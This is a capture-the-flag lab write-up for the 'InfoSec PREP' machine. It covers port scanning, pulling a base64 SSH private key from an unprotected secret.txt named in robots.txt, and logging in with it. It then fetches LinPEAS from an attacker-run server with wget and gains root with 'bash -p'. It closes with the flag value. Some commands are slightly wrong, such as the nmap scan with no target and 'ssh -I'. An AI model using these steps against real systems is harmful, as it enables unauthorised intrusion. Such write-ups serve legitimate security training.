# CTF 1. InfoSec PREP Machine Refresh

## Target #1 – 192.168.100.116

### 1.1.1 Initials Access – Sensitive Information Disclosure

**Vulnerability Explanation:** I found a user named `oscp` on a web page. Additionally, I discovered a `robots.txt` file that supposedly disallowed access to a file named `secret.txt`. However, this restriction was not enforced. The `secret.txt` file contained a BASE64 encoded SSH private key, which I decoded and used to log in with `oscp` user.

**Vulnerability Fix:** Ensure that there should not be any `robots.txt` file or any sensitive files accessible to client.

**Severity:** High

### 1.1.2 Service Enumeration

| IP Address      | Open Ports |
| --------------- | ---------- |
| 192.168.100.116 | TCP: 22,80 |

I Ran Netdiscover to Know the Machine IP Address.

I Ran NMAP Scan to target and found few ports.

```bash
nmap -p- -A  -T4 -Pn -n -oN nmap.txt
```

```bash
nikto -h IP
```

Nikto Finding

* Found `robots.txt` and `WP-LOGIN-PAGE`.

Home Page

Found a user in home page name `oscp`.

In the footer of the page there is LOGIN Page which redirected to Nikto finding of WP-LOGIN Page.

WordPress login page.

The username `admin` outputted as a different error

Viewing the `robots.txt` from Nikto finding.

In `robots.txt` its show the `/secret.txt` file is disallowed however it’s not restricted.

To find out what this is, I used the CyberChef.io MAGIC Recipe (a type of automatic detection). It showed that the data was BASE64 encoded.

After decode the BASE64 its reveal its SSH PRIVATE KEY.

Saved the SSH Private key into key format.

Logged in as a `oscp` user and with the SSH private key

```bash
ssh -I private.key  192.168.100.116
```

Got the initials access

### 1.1.4 Privilege Escalation – SUDO Misconfigured /bin/bash

The sudo configuration allows the `/bin/bash` program to be run as the root user, giving the user the privilege to execute this program. As a result, anything executed by this program will run with root privileges.

Using LinPease for Linux Enumeration.

* Download the LinPease from Github, Releases\
  Link: https://github.com/peass-ng/PEASS-ng/releases/tag/20240804-31b931f7
* Upload LinPease Using Python and download using wget

```bash
python -m http.server 8080
wget http://KALIIPADDRESS:8080/linpease.sh
```

Started the Linpease.

Linpease Found that there is SUDO Misconfigured `/bin/bash` with unnecessary privileges.

`/bin/bash` is misconfigured means it using the root privileges.

I found this GTFObins entry for `/bin/bash` and how to exploit it.

* Link: https://gtfobins.github.io/gtfobins/bash/#suid

```bash
bash -p
```

* `bash` is the command to open a new Bash shell.
* `-p` tells Bash to run in "privileged mode."

### 1.1.5 Post Exploitation

Proof Value.txt

Flag:d73b04b0e696b0945283defa3eee4538
